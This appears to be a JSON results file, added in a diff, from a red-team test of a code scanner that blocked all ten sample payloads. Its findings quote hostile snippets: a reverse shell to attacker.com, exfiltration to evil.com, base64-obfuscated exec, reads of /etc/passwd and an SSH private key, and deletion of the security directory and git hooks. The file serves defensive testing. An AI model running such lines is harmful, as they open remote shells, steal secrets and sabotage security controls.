@@ -1,0 +1,271 @@
+{
+  "test_date": "2026-02-07T13:51:26.399354Z",
+  "root": "c:\\Users\\miche\\Downloads\\scribenova-main\\scribenova-main",
+  "total_tests": 10,
+  "blocked": 10,
+  "bypassed": 0,
+  "skipped": 0,
+  "detection_rate_pct": 100.0,
+  "details": [
+    {
+      "payload_id": "P001",
+      "type": "Secret Leakage",
+      "blocked": true,
+      "stage": "secret_scan",
+      "stages": [
+        "secret_scan"
+      ],
+      "secret_scan_ok": false,
+      "malware_scan_ok": true,
+      "secret_findings": [
+        {
+          "line": 4,
+          "type": "AWS credential",
+          "snippet": "AWS_ACCESS_KEY = \"AKIAIOSFODNN7EXAMPLE\""
+        },
+        {
+          "line": 8,
+          "type": "PostgreSQL URI with password",
+          "snippet": "DATABASE_URL = \"postgresql://admin:password@db.example.com:5..."
+        }
+      ],
+      "malware_findings": [],
+      "time_detection_sec": 0.029698,
+      "critical": true
+    },
+    {
+      "payload_id": "P002",
+      "type": "Backdoor",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "shell_true",
+          "line": 9,
+          "snippet": "return subprocess.check_output(cmd, shell=True)"
+        }
+      ],
+      "time_detection_sec": 0.038934,
+      "critical": true
+    },
+    {
+      "payload_id": "P003",
+      "type": "Reverse Shell",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "obfuscated_import",
+          "line": 6,
+          "snippet": "__import__('os').system('bash -i >& /dev/tcp/attacker.com/4444 0>&1')"
+        }
+      ],
+      "time_detection_sec": 0.009019,
+      "critical": true
+    },
+    {
+      "payload_id": "P004",
+      "type": "Data Exfiltration",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "exfil_requests_post",
+          "line": 9,
+          "snippet": "requests.post('https://evil.com/collect', json=base64.b64encode(str(sensitive)))"
+        }
+      ],
+      "time_detection_sec": 0.010147,
+      "critical": true
+    },
+    {
+      "payload_id": "P005",
+      "type": "Cryptominer",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "crypto_mining",
+          "line": 1,
+          "snippet": "# RED TEAM PAYLOAD - Cryptominer (solo per test detection)"
+        }
+      ],
+      "time_detection_sec": 0.007046,
+      "critical": true
+    },
+    {
+      "payload_id": "P006",
+      "type": "Offuscamento",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "dangerous_exec",
+          "line": 3,
+          "snippet": "exec(__import__('base64').b64decode("
+        }
+      ],
+      "time_detection_sec": 0.008025,
+      "critical": true
+    },
+    {
+      "payload_id": "P007",
+      "type": "eval/exec",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "dangerous_exec",
+          "line": 1,
+          "snippet": "# RED TEAM PAYLOAD - eval/exec (solo per test detection)"
+        },
+        {
+          "pattern": "dangerous_exec",
+          "line": 4,
+          "snippet": "eval(\"os.system('id')\")"
+        },
+        {
+          "pattern": "dangerous_exec",
+          "line": 5,
+          "snippet": "exec(open(\"/etc/passwd\").read())"
+        },
+        {
+          "pattern": "sensitive_path",
+          "line": 5,
+          "snippet": "exec(open(\"/etc/passwd\").read())"
+        }
+      ],
+      "time_detection_sec": 0.007045,
+      "critical": true
+    },
+    {
+      "payload_id": "P008",
+      "type": "Sensitive Path I/O",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "sensitive_path",
+          "line": 4,
+          "snippet": "with open(\"/etc/passwd\") as f:"
+        },
+        {
+          "pattern": "sensitive_path",
+          "line": 6,
+          "snippet": "with open(\"/root/.ssh/id_rsa\") as k:"
+        }
+      ],
+      "time_detection_sec": 0.009092,
+      "critical": true
+    },
+    {
+      "payload_id": "P009",
+      "type": "Ultra Destructive / Security Sabotage",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "destruction_rmtree",
+          "line": 15,
+          "snippet": "shutil.rmtree(security_dir)"
+        },
+        {
+          "pattern": "destruction_remove",
+          "line": 20,
+          "snippet": "os.remove(path)"
+        },
+        {
+          "pattern": "shell_true",
+          "line": 22,
+          "snippet": "subprocess.run(\"rm -rf security .git/hooks/pre-commit .git/hooks/pre-push\", shel"
+        }
+      ],
+      "time_detection_sec": 0.010091,
+      "critical": true
+    },
+    {
+      "payload_id": "P010",
+      "type": "Evasion Bypass (subprocess list / pathlib)",
+      "blocked": true,
+      "stage": "malware_patterns",
+      "stages": [
+        "malware_patterns"
+      ],
+      "secret_scan_ok": true,
+      "malware_scan_ok": false,
+      "secret_findings": [],
+      "malware_findings": [
+        {
+          "pattern": "destruction_subprocess_rm_list",
+          "line": 8,
+          "snippet": "subprocess.run([\"rm\", \"-rf\", \"security\"])"
+        },
+        {
+          "pattern": "destruction_subprocess_rd_list",
+          "line": 9,
+          "snippet": "subprocess.run([\"rd\", \"/s\", \"/q\", \"security\"], shell=False)"
+        },
+        {
+          "pattern": "sabotage_pathlib_security",
+          "line": 11,
+          "snippet": "for f in Path(\"security\").rglob(\"*\"):"
+        },
+        {
+          "pattern": "sabotage_pathlib_security",
+          "line": 13,
+          "snippet": "Path(\"security\").rmdir()"
+        }
+      ],
+      "time_detection_sec": 0.007072,
+      "critical": true
+    }
+  ]
+}
